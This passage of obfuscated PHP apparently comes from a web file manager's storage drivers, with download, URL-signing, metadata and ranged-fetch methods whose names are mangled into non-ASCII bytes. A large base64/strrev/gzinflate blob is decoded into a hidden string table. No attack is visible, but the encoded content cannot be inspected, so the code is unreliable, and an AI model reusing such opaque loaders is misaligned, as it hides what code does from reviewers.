"\x50\117\123\x54\46{$ÏîìæÑÖ}\46{$ïÙ˜•ß«}\x26{$ŒŒå”´Ó}", md5("{$this->userpass}"), !0)); $¯îš÷ñ¯ = array($ôÍ¸ÔÌ[280] => $ŒŒå”´Ó, $ôÍ¸ÔÌ[1638] => "\125\120\x59\x55\x4e\x20{$this->username}\x3a{$í—ş…â}", $ôÍ¸ÔÌ[209] => $this->endpoint . $ÏîìæÑÖ); return $¯îš÷ñ¯; } public function download($óçÃ…ÆÇ, $•òœÊƒ) { $ÔÔâ¯Ò = IO::getPathInner(IO::mkfile($•òœÊƒ)); if (!($‹±º¼‘‡ = $this->link($óçÃ…ÆÇ))) { return !1; } $¯”£ãøÄ = 0; $”É÷÷¼û = 1024 * 200; $ó†¦ì§ = fopen($ÔÔâ¯Ò, $_SERVER[åÄ¼Ùßš][1586]); while (!0) { $¢ôãª‹ = $this->fileSubstr($óçÃ…ÆÇ, $¯”£ãøÄ, $”É÷÷¼û); if ($¢ôãª‹ === !1) { return !1; } fwrite($ó†¦ì§, $¢ôãª‹); $¯”£ãøÄ += $”É÷÷¼û; if (strlen($¢ôãª‹) < $”É÷÷¼û) { break; } } fclose($ó†¦ì§); return $•òœÊƒ; } public function link($÷è‹ñ“Ï, $²ÔÍ„½Ã = array()) { $şı«¯û© =& $_SERVER[åÄ¼Ùßš]; $÷è‹ñ“Ï = trim($÷è‹ñ“Ï, $şı«¯û©[8]); if (!empty($this->token)) { $ÅŒ˜°½ = strtotime(date($şı«¯û©[1639])); $„Š´ş‹» = substr(md5($this->token . $şı«¯û©[287] . $ÅŒ˜°½ . $şı«¯û©[1640] . $÷è‹ñ“Ï), 12, 8) . $ÅŒ˜°½; $²ÔÍ„½Ã[] = $şı«¯û©[1641] . $„Š´ş‹»; } $û¸ĞÓ¼Ò = !empty($²ÔÍ„½Ã) ? $şı«¯û©[76] . implode($şı«¯û©[287], $²ÔÍ„½Ã) : $şı«¯û©[12]; return $this->getHost() . $şı«¯û©[8] . $this->pathEncode($÷è‹ñ“Ï) . $û¸ĞÓ¼Ò; } public function fileOut($´£ĞùÉù, $Å«½»‡ = false, $Ï­å—ï÷ = false, $‹¼¶”ÑÍ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($´£ĞùÉù, $Å«½»‡, $Ï­å—ï÷, $‹¼¶”ÑÍ); } if (!$Ï­å—ï÷) { $Ï­å—ï÷ = $this->pathThis($´£ĞùÉù); } $ŠÔèÁíî = $Å«½»‡ ? array($_SERVER[åÄ¼Ùßš][1642] . rawurlencode($Ï­å—ï÷)) : array(); $–Œ”ìœõ = $this->link($´£ĞùÉù, $ŠÔèÁíî); $this->fileOutLink($–Œ”ìœõ); } public function fileOutServer($ÜÑ­ÕÙ¹, $ßÏ›òĞŞ = false, $ ¸ÑÅ¯Ä = false, $†ÒÉ‡¹¸ = '') { parent::fileOut($ÜÑ­ÕÙ¹, $ßÏ›òĞŞ, $ ¸ÑÅ¯Ä, $†ÒÉ‡¹¸); } public function fileOutImage($ø«ÙªÛ, $ˆ„ƒ©› = 250) { $˜íÌ´š† = $this->link($ø«ÙªÛ . $_SERVER[åÄ¼Ùßš][1643] . $ˆ„ƒ©›); $this->fileOutLink($˜íÌ´š†); } public function fileOutImageServer($ßäÉÙ›, $Úğ”´¹¼ = 250) { parent::fileOutImage($ßäÉÙ›, $Úğ”´¹¼); } public function hashMd5($’…Í´ Ú) { $óø¦íœõ =& $_SERVER[åÄ¼Ùßš]; $ë±ŒÍê‹ = $this->_objectMeta($’…Í´ Ú); return isset($ë±ŒÍê‹[$óø¦íœõ[248]]) ? $ë±ŒÍê‹[$óø¦íœõ[248]] : !1; } public function size($Ú”ô„›Ú) { $êÔ™ºŸÑ = $this->objectMeta($Ú”ô„›Ú); return $êÔ™ºŸÑ ? $êÔ™ºŸÑ[$_SERVER[åÄ¼Ùßš][79]] : 0; } public function info($††·Ò°Œ) { if ($this->isFolder($††·Ò°Œ)) { return $this->folderInfo($††·Ò°Œ); } else { if ($this->isFile($††·Ò°Œ)) { return $this->fileInfo($††·Ò°Œ); } } return !1; } public function exist($ÔÃ¨ª–¦) { return $this->isFile($ÔÃ¨ª–¦) || $this->isFolder($ÔÃ¨ª–¦); } public function isFile($íºêôİ) { return !$this->isFolder($íºêôİ) && $this->objectMeta($íºêôİ); } public function isFolder($ßñ¿ƒÚª) { return $this->cacheMethod($_SERVER[åÄ¼Ùßš][180], $ßñ¿ƒÚª); } protected function objectMeta($ƒ¸ä­ãó) { return $this->cacheMethod($_SERVER[åÄ¼Ùßš][182], $ƒ¸ä­ãó); } protected function _objectMeta($ï¢®’éÛ) { $Ô„¨‡£– =& $_SERVER[åÄ¼Ùßš]; if ($ï¢®’éÛ == $Ô„¨‡£–[12] || $ï¢®’éÛ == $Ô„¨‡£–[8]) { return array(); } $ĞÙœÚûº = $this->ussRequest($ï¢®’éÛ, $Ô„¨‡£–[1644]); if (!$ĞÙœÚûº[$Ô„¨‡£–[1335]]) { return null; } $Å’»ÊÒù = isset($ĞÙœÚûº[$Ô„¨‡£–[1325]]) ? $ĞÙœÚûº[$Ô„¨‡£–[1325]] : array(); if (!isset($Å’»ÊÒù[$Ô„¨‡£–[1645]])) { return null; } $½½ŠşÙä = array($Ô„¨‡£–[33] => isset($Å’»ÊÒù[$Ô„¨‡£–[1645]]) ? $Å’»ÊÒù[$Ô„¨‡£–[1645]] : null, $Ô„¨‡£–[79] => isset($Å’»ÊÒù[$Ô„¨‡£–[1646]]) ? $Å’»ÊÒù[$Ô„¨‡£–[1646]] : null, $Ô„¨‡£–[248] => isset($Å’»ÊÒù[$Ô„¨‡£–[1647]]) ? $Å’»ÊÒù[$Ô„¨‡£–[1647]] : null, $Ô„¨‡£–[1614] => isset($Å’»ÊÒù[$Ô„¨‡£–[1648]]) ? $Å’»ÊÒù[$Ô„¨‡£–[1648]] : null); $½½ŠşÙä[$Ô„¨‡£–[1615]] = isset($Å’»ÊÒù[$Ô„¨‡£–[1649]]) ? strtotime($Å’»ÊÒù[$Ô„¨‡£–[1649]]) : $½½ŠşÙä[$Ô„¨‡£–[1614]]; return $½½ŠşÙä; } protected function _isFolder($á˜Ç ü¹) { $ßá±Ã«ö =& $_SERVER[åÄ¼Ùßš]; if ($á˜Ç ü¹ == $ßá±Ã«ö[12] || $á˜Ç ü¹ == $ßá±Ã«ö[8]) { return !0; } $¦êğİ¬£ = $this->_objectMeta($á˜Ç ü¹); return isset($¦êğİ¬£[$ßá±Ã«ö[33]]) && $¦êğİ¬£[$ßá±Ã«ö[33]] == $ßá±Ã«ö[78] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($”¶·şï² = false) { } public function exist($ò™âá¯Ì) { $»£á§û¡ = $this->info($ò™âá¯Ì); return $»£á§û¡[$_SERVER[åÄ¼Ùßš][235]]; } public function isFile($ğ…½öÓ¾) { $—«¨¬É = $this->info($ğ…½öÓ¾); return $—«¨¬É[$_SERVER[åÄ¼Ùßš][235]]; } public function isFolder($Û®ÁĞØ†) { return !1; } public function size($×íÏå´ˆ) { $‰ ôğ  = $this->info($×íÏå´ˆ); return $‰ ôğ [$_SERVER[åÄ¼Ùßš][79]]; } public function info($ØÍ†ø¬œ) { return $this->infoParse($ØÍ†ø¬œ); } public function infoAuth($ó­•¼ÜŠ) { return $this->infoParse($ó­•¼ÜŠ); } public function infoWithChildren($ßûÛáÒò) { return $this->infoParse($ßûÛáÒò); } public function infoFull($“’¤¦å®) { return $this->infoParse($“’¤¦å®); } private function infoParse($Àú™Ÿå) { $à³åĞÌ =& $_SERVER[åÄ¼Ùßš]; $¸¼õÕÙÅ = $this->header($Àú™Ÿå); if (!$¸¼õÕÙÅ || !$¸¼õÕÙÅ[$à³åĞÌ[843]]) { return !1; } $ªü‚Õ² = _get($¸¼õÕÙÅ, $à³åĞÌ[414], 0); $Í«¹ºÛ = array($à³åĞÌ[32] => $¸¼õÕÙÅ[$à³åĞÌ[32]], $à³åĞÌ[87] => $Àú™Ÿå, $à³åĞÌ[33] => $à³åĞÌ[233], $à³åĞÌ[79] => intval($ªü‚Õ²), $à³åĞÌ[169] => get_path_ext($¸¼õÕÙÅ[$à³åĞÌ[32]]), $à³åĞÌ[1501] => $ªü‚Õ² > 0 && $¸¼õÕÙÅ[$à³åĞÌ[1650]], $à³åĞÌ[1502] => !1); return $Í«¹ºÛ; } private function header($”×í¢ä¥) { $ĞÏèÌ‘ì =& $_SERVER[åÄ¼Ùßš]; if (isset(self::$_cacheHeader[$”×í¢ä¥])) { return self::$_cacheHeader[$”×í¢ä¥]; } $˜ÁåøÜ = isset($GLOBALS[$ĞÏèÌ‘ì[1651]]) ? $GLOBALS[$ĞÏèÌ‘ì[1651]] : !1; $GLOBALS[$ĞÏèÌ‘ì[1651]] = !0; self::$_cacheHeader[$”×í¢ä¥] = url_header($”×í¢ä¥); $GLOBALS[$ĞÏèÌ‘ì[1651]] = $˜ÁåøÜ; return self::$_cacheHeader[$”×í¢ä¥]; } public function hashSimple($Ã²øç«Õ, $šå½™„¾ = false) { $É«û‰­ =& $_SERVER[åÄ¼Ùßš]; $¶Š£¡áø = $this->info($Ã²øç«Õ); if (!$¶Š£¡áø || !$¶Š£¡áø[$É«û‰­[235]]) { return !1; } $ÜÙô¸ï = $¶Š£¡áø[$É«û‰­[79]]; $åÖÔùåâ = 200; $¿™ÀØ“ß = 50; if ($ÜÙô¸ï <= $åÖÔùåâ * $¿™ÀØ“ß) { return md5($this->fileSubstr($Ã²øç«Õ, 0, $ÜÙô¸ï)) . $ÜÙô¸ï; } $•Èª İò = intval($ÜÙô¸ï / $¿™ÀØ“ß); $ŠñÏ‚É = $É«û‰­[12]; $è”­‚ÙÛ = timeFloat(); $ğÂä”  = 15; for ($ñ•ÍØÎ = 0; $ñ•ÍØÎ < $¿™ÀØ“ß; $ñ•ÍØÎ++) { if (timeFloat() - $è”­‚ÙÛ > $ğÂä” ) { return !1; } $ áâ²Ğ× = $this->fileSubstr($Ã²øç«Õ, $•Èª İò * $ñ•ÍØÎ, $åÖÔùåâ); if (!$ áâ²Ğ×) { return !1; } $ŠñÏ‚É .= $ áâ²Ğ×; } $ŠñÏ‚É .= $this->fileSubstr($Ã²øç«Õ, $ÜÙô¸ï - $åÖÔùåâ, $åÖÔùåâ); return md5($ŠñÏ‚É) . $ÜÙô¸ï; } public function getContent($Úá¬šÂ) { return $this->fileSubstr($Úá¬šÂ); } public function fileSubstr($–•˜ ¬, $Šôİ°ò¤ = 0, $±Î÷É½ = -1) { $úì•²ë¯ =& $_SERVER[åÄ¼Ùßš]; $“„Í–Ûé = $this->info($–•˜ ¬); if (!$“„Í–Ûé || !$“„Í–Ûé[$úì•²ë¯[235]] && $“„Í–Ûé[$úì•²ë¯[79]] > 1024 * 1024 * 10) { return !1; } if ($±Î÷É½ === -1) { $±Î÷É½ = $“„Í–Ûé[$úì•²ë¯[79]]; } if ($±Î÷É½ == 0) { return $úì•²ë¯[12]; } $“ş…µã¦ = array($úì•²ë¯[1652] . $Šôİ°ò¤ . $úì•²ë¯[883] . ($Šôİ°ò¤ + $±Î÷É½ - 1)); $‡½ÏÖŸÇ = url_request($–•˜ ¬, $úì•²ë¯[1541], !1, $“ş…µã¦, !1, !1, 30); return $‡½ÏÖŸÇ[$úì•²ë¯[1325]] ? $‡½ÏÖŸÇ[$úì•²ë¯[1325]] : $úì•²ë¯[12]; } public function download($ÔìÔŠÁé, $Ó³™¿¼) { Downloader::start($ÔìÔŠÁé, $Ó³™¿¼); return $Ó³™¿¼; } } goto EäñºÕ; e½ß‰Û„äŸ: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define(base64_decode('5cS82d+a'), strrev('³ÕŠÁç')); $_SERVER[åÄ¼Ùßš] = explode("\x7c\x3\x7c\x3\x7c\x4", gzinflate(substr(strrev('ÆòV–³fÄä‘’È‹²È\'çaÑL]ğ¥¥BĞ(W)N8õÅ|	½Å'."\0".''."\0".''."\0".''."\0".''."\0".''."\0".'‹')."\x92\x56\xd6\xae\x7c\xe4\xe0\x3e\x3\x21\xa1\xdc\x29\x94\xab\x50\x8e\x92\x70\x94\x9b\x40\xb9\xdb\xd2\x52\x68\x4b\xb9\xa\x94\x12\x3b\xa1\xa5\x50\x4a\x39\xca\xd1\xfe\xe7\x78\x73\xec\x4a\x86\xef\xff\xf3\xfb\x7d\x3e\xbf"."\x40\xa2\xb9\x77\xe6\xcd\x9b\x37\x6f\xde\xbc\xf7\xe6\xae\x5f\x9f\x71\xe1\x47\x6f\xad\xff\x3a\xfa\x6f\xaf\x47\x7f\x75\xd1\xab\x1f\x9f\x4d\xc3\xe4\xdf\xaf\xd1\xf0\xff\x9c\xb7\xdf\x1e\xe4\xcf\xb7\xcf\xdb\x58\x57\xd7\x31".base64_decode('Z//p0QM2/+w2bZ/Wpz554me/vvIPf/71Lcn0ogeuzB61x4Nt1rHNqCit2Ux/lIJpK/qIYdkW')."\115\110\231\205\214\221\245\141\243\100\177\375\364\247\73\36\51\351\171\323\326\151\324\107\177\124\251\127\173\131\203\71\203\345\253\321\130\122\115\164\167\165\205\342\111\50\324\54\347\347\315\64\204\212".base64_decode('WknLw/eLeslCvZGbU4tmUS84UkRCWrO1Ps2Cltpa1bZQVyS2Uk2u7ApBiT51sKyXRmmMBBO2').base64_decode('VrKTRl7nJYZLvF+toSXhqJKMB6KJQDAZjkVpcjDW2RlOVqbHY5FIayC4tDKnKx5Y0hlQUP9y').strrev('Æ¼Œ–)›V€9ÊÑ´¡å4rç(TÓBIBhö;¬h,isĞİ iêV¬æš²f2jº')."\xbd\x54\x1f\xe5\xa9\x34\xa0\x95\x6d\xd3\x28\xa4\x68\x24\x34\x62\x97\x34\x91\x8e\xfa\x9a\x42\x13\xad\x17\xa0\xa9\x44\x28\x12\xa\x26\x15\xdc\x41\xa5\x3d\x1e\xeb\x54\x60\x12\xf2\x9a\x65\xeb\x25\x65\x79\x47\x28\x1e\x52"."\160\247\133\152\311\130\153\25\300\227\50\2\205\22\210\104\224\211\132\260\365\174\221\65\103\353\124\151\54\26\157\13\305\225\326\225\212\200\120\312\314\347\315\202\17\265\202\146\322\226\272\32\212\307"."\x69\xc0\x3\xe8\x1d\x9\xe3\x49\x83\x48\xac\xbd\x3d\x11\xe2\x31\x18\xdc\xf1\x11\xd4\x93\x99\x80\x9f\x8e\x58\x3a\x93\xb3\xd5\x21\x2d\x57\x66\x68\x3a\x40\x7f\x6b\xe1\x7\x7e\x4d\xb\x50\x77\xd0\x28\x18\x65\x40\x53\x68"."\xc2\x34\xf9\xb2\x82\x40\x99\x95\xd6\x59\x8a\x9e\x86\x40\x1e\xd5\x37\xa1\x5e\x1f\xa4\xf5\xb1\x52\x6b\x58\xc0\x40\x2b\x74\x88\x6\x5b\x16\xd1\xdf\x5\x50\xbf\x4f\xc5\x79\x7a\xc9\x56\xf5\x42\xca\x4c\x1b\x5\x58\xc7\x8b"."\x1\x1f\x35\xbb\xbf\xad\x64\xa0\x2\x34\x9e\x31\x73\x69\x16\xb6\x8c\xb5\x30\xca\x8c\x91\xd3\xa3\xe5\xbc\x5c\x84\x47\x53\xfd\x46\x2e\x5d\x62\x4b\xef\xcb\x4a\xd2\x68\x84\xaf\x64\x5c\x56\xc4\x8a\xa8\x27\xeb\x19\x11\x30"."\62\243\142\51\342\162\135\74\327\62\313\245\224\36\106\113\207\306\233\40\131\267\155\64\70\6\20\263\273\230\63\265\164\102\57\361\241\31\146\73\152\50\126\266\345\304\62\51\326\156\226\362\155\210"."\x68\xc8\x69\x9d\x68\xd9\x18\x22\x71\x80\x2d\x97\xb4\x4\x2d\x7f\xdd\xaa\x53\xbd\xff\xe9\x5d\x75\x2c\xfa\xa7\x1e\x28\x62\xf\xf4\xa7\x5f\xcf\xe5\x54\x7d\x44\x87\xf5\x94\x4f\xcf\xb6\x18\x20\xfc\x56\x9f\x51\xf0\xa3\x14"."\32\15\307\324\176\315\352\357\114\317\126\111\55\350\156\41\255\217\370\212\375\105\32\25\53\275\307\201\357\30\154\121\323\16\111\344\72\147\246\264\234\74\24\32\356\267\355\142\102\57\244\61\24\140"."\x28\xe6\x70\x81\x40\xa9\xa8\xeb\x50\xa8\xcd\xa3\xa4\x95\x4e\x65\xa5\xd2\xd1\x6c\x34\x5b\xac\x62\x3e\xc7\x43\x6c\x74\x3c\xcd\xe2\x89\xf6\x8\x9b\xca\x74\x6\x30\x95\xed\x16\x35\xf0\x41\xc3\x22\x84\x4f\xac\x5a\xad\x58"."\314\31\51\315\66\314\202\337\114\331\272\355\265\354\222\256\101\213\201\124\112\267\54\157\320\54\330\45\63\347\15\344\162\346\260\67\126\62\262\106\241\131\151\240\145\160\46\132\353\136\114\27\233\141".strrev('4E„Çê–¶Ù¢³^îZh«ÚÅdq9gPVhªÁ'."\r".'ä½X+It¼˜[wŒí”´4ÏàÒ0P,×')."\xdf\xf2\x25\xe5\x8d\x42\xce\x28\xe8\x95\x65\x51\x23\xba\xb7\xab\xa4\x65\xf3\x5a\xb3\x52\x2c\xf7\x21\x0\xc0\x62\x84\xb4\x14\x2e\x21\x17\x6\x0\x34\x2b\x79\x6d\xc4\xab\x65\x59\x4b\xa1\x91\xa2\x51\xd2\x2d\x36\x6a\x65".base64_decode('SWcSMCrj7cSLyNDT3gSi3NDYzMZZCsIVheXR1I5ksksNt6OtORpSOwPJYAe0bmtZ1nQE0WPe')."\44\113\134\341\105\213\11\143\123\24\15\116\44\166\231\303\172\11\175\270\165\264\131\31\60\323\175\346\210\217\145\341\302\11\104\125\130\141\74\277\105\333\33\327\12\131\74\214\276\121\133\7\234\23"."\x74\xa9\x15\x6d\xe4\xbe\xc\x5d\xb9\xbe\x3e\x3d\x63\x96\x60\x34\xd6\x50\xd6\x9\xfc\x88\x5e\xc8\xda\xfd\xac\xed\x44\x28\xbe\x2c\x14\x57\x13\xb1\xf6\xe4\xf2\x40\x1c\xf6\xfd\x2\xc2\x9c\x11\xd6\x1b\xfc\xf5\x9c\x37\xae"."\xa7\x11\x10\x53\x36\xab\xa7\x15\x5\xf4\x57\x78\xf1\x82\xc1\x1f\x67\xb9\x78\x11\xb1\xbc\x48\x78\x9\x86\x5d\x9b\xd7\x42\x85\xbc\x72\x29\xd6\x76\xc4\xc8\x1b\x78\x78\x36\xcf\x21\xc0\x46\x4c\xc1\x12\xe8\x90\x9f\x8c\xb9"."\245\307\152\250\353\111\117\257\367\242\177\33\352\127\365\264\371\32\172\27\373\15\121\307\337\344\153\122\146\64\316\121\272\20\227\142\150\71\5\6\135\121\242\121\211\55\165\202\105\140\170\301\54\350".base64_decode('VRcWQiTT0r0duoYINJoIx7x42Ldo/Eugi/dJiZa45oUmxkPHd4cSSbUzlOyItUH3QwEIFVBl')."\xd2\x5f\x36\xc7\x98\x29\xa3\x41\x4\x63\x8\x8c\x48\xfb\x87\xd8\x7\x52\x32\x40\x48\xbd\xa8\x39\xbc\x1e\x28\xbf\xb\x81\x82\xfd\x7a\x6a\x60\x82\x3c\x14\x82\xd1\x98\x94\x2e\xb1\xa9\x5b\x45\x7f\x7a\x1\x9b\x7b\xe9\x8f"."\252\6\43\241\100\134\5\156\126\65\254\166\151\13\305\121\116\156\125\263\157\15\102\264\116\235\355\51\360\341\160\36\55\151\61\20\325\271\337\261\121\166\12\304\107\53\150\271\221\346\33\42\212\166".base64_decode('6Ea2H/pt4OZSZs4saTm8FTAeNmsAVS7mymgZ+HHDyf5yvg82LgSyrG4L9tIaRTwYEGLEjSPY')."\x86\x61\x96\x60\xb\x86\x98\x5f\xc5\xa8\xdb\xe3\x2b\x16\xb2\xf5\x53\xa0\x2d\x75\xc6\xec\x46\x9c\x0\xb3\xa\x23\x43\x7c\x76\x59\xaf\x1c\xba\x2f\x65\xa2\x75\xde\xa9\xd\xe8\xcd\x78\x2c\x40\xdc\x16\x90\x54\x16\x91\xe8"."\347\2\274\345\265\270\311\4\236\255\234\57\217\32\41\155\6\115\276\111\323\223\14\360\103\154\313\123\364\122\311\54\35\15\45\110\130\41\373\46\236\56\150\334\346\34\210\205\50\2\13\367\233\234"."\x63\x31\x19\x6e\x36\xfb\x61\xdc\x53\x67\xb4\x3\x15\x49\x23\xce\xcd\x67\xd9\x68\x12\xd0\x0\xb5\x74\xba\x5a\x32\xa2\x3c\xd0\xc0\x7a\x86\xb6\x24\x63\x3d\xb0\x5\xfe\xc4\x4c\xf4\xbf\xe0\x1\xd2\x66\x5e\x63\x3b\x2a\x26".strrev('FXÎ¿X!9ëH0g#æ\\°:~ÒB$£’Ìâm’Éö¤ÓtI\'İ4õ&Ùñb8³üD').base64_decode('KIZmhqNfhq8DdJBAqYK/M6w4qokZAxZfjk9eIgFzR4BXIphDsxojC0rEu0p6xgD6XkB0olMr')."\xd\xb0\x81\xa1\x9a\x62\x29\xe2\x88\xb4\x4c\xdb\xbb\x23\x11\x35\x18\x8b\x26\xd1\xc1\x8d\xa6\x2c\x8f\x87\x93\x40\xd5\xe2\x88\x3a\xa9\x81\x60\x17\xc4\x4\xd\xe4\xc\x9c\xcc\x82\xd0\x94\xa1\x19\x80\x42\xa8\x13\x7e\xc1"."\x2b\xa1\xcd\xba\x68\x16\x10\xa5\x5\x62\xe5\x15\xc7\xba\x8a\xac\xb4\x60\x25\x0\x77\x4\xfb\xe1\xe2\x28\x10\x4f\x90\x5f\xeb\xcd\x23\xba\xe2\xe5\x7d\xea\xea\x6\x5e\x80\x61\x5\x63\x89\x5b\x47\x31\xb7\xb\x93\x6f\x64"."\xb\xcb\xf8\xcc\x2f\x4f\xcc\xf2\x76\x74\x6\x82\xde\x44\x47\x60\xc6\xec\x39\x34\x75\x65\x3e\xdd\x93\xec\x30\xac\x9e\x13\x78\x1c\xba\x33\x6c\xcd\x52\x4b\x3a\x5a\xd3\xc\x17\x66\x34\x36\xb1\x15\x87\xf8\x12\x4d\xf4\x7c".base64_decode('pTfvxa1gltLX2NjI2po+R+lHpGQ9o99pMlrgAPrKqQFdJueWd9hgNG8KZ8enVALfKpPdTdVS')."\xb8\x39\x15\x55\xb6\xcb\x96\xc\x29\x84\x80\x69\x54\xc5\x60\x5c\x32\x4d\xd5\x72\x59\x13\xe1\x5d\x7f\x5e\x4e\x4c\x73\xfc\xa5\x71\x9d\xb2\x5c\xf0\xa1\x7e\x8d\xc3\x9\x43\x8f\x2d\xe\xc4\xd0\x8d\xca\x95\x30\x98\x51\x1f".base64_decode('GP128thKsjqgKeseBmiLfhTxzoaoNpu2afRnf+hGGa3bkrFWgv5i1hKjmbEEfHIknxPnLwAN').base64_decode('QFMe2oiKclTIUeWcDk4H2Cx0trnWBN38adrCxeiLyhCW5piFltomX2Otwk6lLbXdyXbEpy9e')."\xb4\xff\xc2\xa0\x99\x2f\x62\xb2\x42\x8e\x60\x78\xbc\x14\x73\x17\xc1\x18\x17\x62\x1e\x88\x45\xba\x5c\xe0\x8\x25\x35\xd8\x75\x16\xfa\xe5\x72\xb\xfd\x13\xb5\xa\x43\xc1\x8c\xd9\xa\xb5\x2b\x12\x48\xb6\xc7\xe2\x9d\x80"."\xe3\xc5\xa2\x40\xab\x62\xaa\xda\x6a\xf3\xa\x8a\x54\xb6\xbc\x3a\xe6\x93\x61\x15\x68\xa9\x9c\xb\x45\x65\x58\xac\xa8\x8a\x89\x2b\xaa\x61\xe2\xa\x17\x26\xae\xa8\xc4\xc4\x15\xd5\xf0\x6c\x8\x10\x52\xcb\x6b\x6b\xcd\x2"."\132\257\150\243\315\373\122\200\26\311\216\160\164\251\332\31\153\13\105\324\160\24\361\163\311\312\364\356\256\266\0\43\203\162\172\153\54\331\341\110\355\106\34\335\262\100\44\354\56\36\132\21\116\44"."\x13\x55\xb3\x50\x5a\x77\xc8\x95\xd3\xd6\xaa\x76\xc5\x43\xed\xe1\x15\x3c\xda\x1e\xe\x45\xda\x12\x6a\x30\x10\xec\x10\x65\xa2\x81\x4e\x88\x20\x5e\x49\xcf\xa5\x2d\xbf\xb3\xbc\x8a\x58\xd3\x4\x17\xb9\xa9\x80\x70\x10\x73".base64_decode('SLlUJr9RBSVGxxwdpgOGi4WWZCTA5KXMMmc02Zk+z7ZadEQDsLPzSR39qVcCCcUuQhtoU+0b')."\345\101\62\14\26\107\134\10\174\137\1\66\271\242\7\52\56\323\52\35\206\252\47\4\62\66\347\104\135\161\264\205\210\74\64\3\1\42\35\105\230\100\146\4\76\143\240\15\251\144\7\130\167\62"."\102\62\251\306\272\102\361\0\226\153\252\313\343\261\350\22\250\60\334\257\263\16\204\1\374\165\354\164\12\342\115\133\354\353\132\316\320\0\201\363\2\350\153\114\6\112\164\42\147\74\177\201\301\271".base64_decode('DzM1jNNlgQxayIwhMcu8/T7ThDZz+CAGzVsMFUbYtjx9Pdu2AEFjS0NRleEPjUk4RxNC8Xgs')."\16\303\266\315\1\46\0\243\231\361\120\42\4\353\11\157\221\6\3\212\337\67\35\160\125\107\254\34\174\336\177\142\317\360\364\272\125\336\351\276\136\24\250\157\70\226\106\41\326\343\163\104\31\207".base64_decode('XS7x2pj7q7MW1zf3+Hv8dYubVwW8azXv2kbvfG8v4svrp0NC77oZnlkbcAFUcPExveinpWfx').base64_decode('1B7vtJNWH7uqp7e2efrRPb5jeoZ7G+oXs++kyiXE+rP9DHU1Pb0OdQmdVXmRgkR+SQGWsdYo')."\212\324\165\163\66\260\164\64\157\172\126\324\130\345\355\231\336\273\130\252\47\45\271\277\205\50\50\142\364\372\171\271\200\367\4\74\62\136\25\257\156\300\211\162\41\45\66\101\214\375\175\32\77\364".base64_decode('ZQviNGWXuFB0CGGkoLPrptLfDWwiszosbXIhwpiocsEYZMeagj4IAdPmWKzbwzpDD5TuiCPk').base64_decode('YLQfZUmxnLRXEAkWx1GOTEZRxSe8YR5DWwnM0yQobaW0op6QRqiqyUBrJMSPq0BvWZzQvlZ+')."\165\202\206\46\350\46\243\2\222\164\212\110\213\140\175\133\203\71\205\54\177\172\264\152\46\267\110\126\271\210\117\111\12\232\161\4\133\5\161\155\112\313\42\205\202\34\352\251\362\4\24\371\351\7"."\213\67\165\261\320\61\35\202\76\25\305\14\131\350\364\301\370\177\177\135\117\117\171\225\236\356\135\205\20\137\363\146\172\327\315\334\120\317\104\50\376\36\364\207\105\2\125\356\63\124\315\146\40\341"."\324\117\135\22\112\372\160\217\270\4\333\21\341\331\64\152\226\370\161\242\350\70\317\333\246\255\345\34\115\44\161\12\114\63\347\277\100\236\113\347\75\42\350\25\146\64\244\53\41\102\76\243\134\176".strrev('´Pÿkn!	E¸R“ÊFQB;Ë? ¬êÔQ2Ø‘_šÄËŠ*™Hğ—¶èH×Né`ùÊ')."\15\256\133\350\277\300\173\102\261\5\120\54\143\24\320\142\16\112\333\51\225\342\47\210\350\301\161\167\145\351\132\51\325\337\136\316\345\154\56\0\312\31\3\320\131\130\251\160\225\346\205\217\115\257"."\x56\x15\x9d\x7e\x98\x3c\xb4\x1\xc4\xd2\x35\xd\xd5\xa\x86\xb\x5\x33\xdd\x27\x23\xba\xd8\xc8\x97\x4\x10\xcb\x94\x54\xea\xd8\xb5\x8f\x12\x8e\x2a\xad\xb1\x58\x24\x14\x88\x2a\x98\x67\x80\xbd\xe\x31\x24\x89\x50\x57"."\0\155\224\130\262\232\110\206\340\46\312\200\311\14\267\171\131\373\53\274\114\236\302\3\146\221\236\137\164\133\315\231\214\164\71\45\61\370\20\350\301\362\20\17\346\137\74\250\327\36\54\102\361\210"."\43\266\107\334\246\170\206\14\175\230\4\370\361\327\3\247\142\217\20\376\100\60\334\346\61\254\66\162\272\47\37\40\131\254\13\166\77\26\164\347\264\121\17\355\116\104\37\322\163\36\46\26\362\260"."\76\172\230\60\314\103\204\130\155\320\255\156\264\230\241\133\44\210\150\166\277\7\43\55\136\63\36\161\277\343\61\207\13\172\211\24\1\260\11\301\200\107\10\15\74\331\222\131\56\166\261\157\112\61"."\xda\x2d\x48\x10\x7d\xe6\x9\x71\xd3\xb4\x3d\x4c\xbe\xe6\x91\x5\x6d\xd0\x8b\x0\x5b\x9b\x55\xc1\x59\x7d\x34\x4\xfe\xee\x4e\x0\x7e\xe1\xac\x4a\x28\x7d\xc5\x64\x55\xce\x87\x53\xc6\xb8\x8e\xb6\x8\xf2\xd5\xd\x6c\x8f"."\x75\x94\x21\xb2\x3e\xce\xe1\x62\x80\x8b\x90\xb4\xe6\xf1\x0\xda\x35\xb8\x49\xa4\xcd\xca\x61\x86\x75\x6c\x67\x63\x68\x2c\xae\x73\xc4\x25\x9e\xe0\xa7\xdd\xe2\x1e\xf7\xf5\x1e\xfe\x28\x3a\xb4\x25\xa4\xcf\xd9\x5a\x96\x7d"."\13\23\110\176\244\253\122\224\206\343\172\152\64\45\344\107\155\222\124\312\31\343\320\47\53\247\32\326\127\237\125\216\311\174\22\366\237\64\211\101\225\241\67\237\121\307\252\370\352\365\10\43\41\104".base64_decode('L1YUTAvtLCb2CbSJtucYGGbI2UDmPc4YXk4+QsLJFXmCiyojofakclwM0SvDVGkdFRdWyD9m')."\x41\x71\xb4\xcd\xc0\x85\xa8\x3c\x69\x91\xc7\xb5\x42\x9a\xa6\xac\x46\xfb\xc9\xea\x96\x1a\xf6\x91\x1a\x47\x75\x81\x18\xce\x4e\x78\x58\xd4\xf1\x35\x31\xc7\x32\x10\x30\x2\x90\xe1\x8b\x3d\x90\x25\xc5\xc4\x96\x5b\x6\x4e"."\123\263\122\64\200\5\275\2